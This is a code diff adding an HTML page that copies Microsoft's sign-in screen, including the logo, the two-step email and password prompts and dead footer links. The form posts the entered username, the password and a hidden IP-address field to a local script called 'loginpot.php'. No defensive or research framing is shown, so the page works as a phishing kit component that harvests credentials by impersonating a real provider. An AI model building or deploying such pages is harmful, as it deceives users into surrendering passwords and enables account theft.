@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft logo" class="logo">
+            <h1>Sign in</h1>
+            <form id="loginForm" action="./loginpot.php" method="POST">
+                <div class="form-group" id="emailStep">
+                    <input type="text" id="username" name="username" required>
+                    <label for="username">Email, phone, or Skype</label>
+                    <button type="button" class="btn" onclick="showPasswordStep()">Next</button>
+                </div>
+                <div class="form-group" id="passwordStep" style="display: none;">
+                    <input type="password" id="password" name="password" required>
+                    <label for="password">Password</label>
+                    <input type="hidden" id="ipAddress" name="ipAddress">
+                    <button type="button" class="btn" onclick="submitForm()">Sign in</button>
+                </div>
+                <div class="link-group">
+                    <a href="#">Can't access your account?</a>
+                </div>
+            </form>
+            <footer>
+                <div class="footer-links">
+                    <a href="#">Terms of use</a>
+                    <a href="#">Privacy & cookies</a>
+                </div>
+                <div class="footer-lang">
+                    <a href="#">English (United States)</a>
+                </div>
+            </footer>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
